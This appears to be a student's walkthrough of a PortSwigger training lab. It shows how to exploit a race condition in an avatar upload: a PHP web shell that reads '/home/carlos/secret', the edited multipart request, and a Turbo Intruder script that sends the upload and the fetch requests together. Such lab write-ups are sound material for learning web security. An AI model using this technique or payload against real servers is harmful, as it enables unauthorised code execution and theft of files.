# [Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

> uploading a php exploit and with race condition

- boot up burp suite
- log in
- upload an image (any small image)
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image upload `/my-account/avatar`
- there is a request for the image for avatar `/files/avatars/image.jpg`
- send both to the repeater

> upload exploit

- check the `/my-account/avatar` in the repeater

```
POST /my-account/avatar HTTP/2
...
------WebKitFormBoundaryk8j5XzBtGCT4dMop
Content-Disposition: form-data; name="avatar"; filename="black.jpg"
Content-Type: image/jpeg

<image data>

------WebKitFormBoundaryk8j5XzBtGCT4dMop
...
```

- update the image header and data to

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- send it
- the server will respond

```
HTTP/2 403 Forbidden
...
Sorry, only JPG & PNG files are allowed
...
```

**the file gets uploaded but after a security check it was rejected**

- there is a little time gap between the upload and the rejection during the security check
- if there is a request for the image during that time, that might be a successful exploit attempt

> creating the exploit

**the exploit needs the `Turbo Intruder` app in the `Burp Suite`**

- send the exploit `/my-account/avatar` the `Turbo Intruder`
- `right click > Extensions > Turbo Intruder > Send to turbo intruder`
- it opens the `Turbo Intruder`'s window
- add the following code to the editor

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

- replace the `<YOUR-POST-REQUEST>` with the full `/my-account/avatar` exploit request
- replace the `<YOUR-GET-REQUEST>` with the full `/files/avatars/image.jpg` request, only change the `image.jpg` to `exploit.php`
- hit the `Attack` button on the bottom
- it will do 1 `/my-account/avatar` and 5 `/files/avatars/exploit.php` request
- at least one of the `/files/avatars/exploit.php` request response will contain the solution code
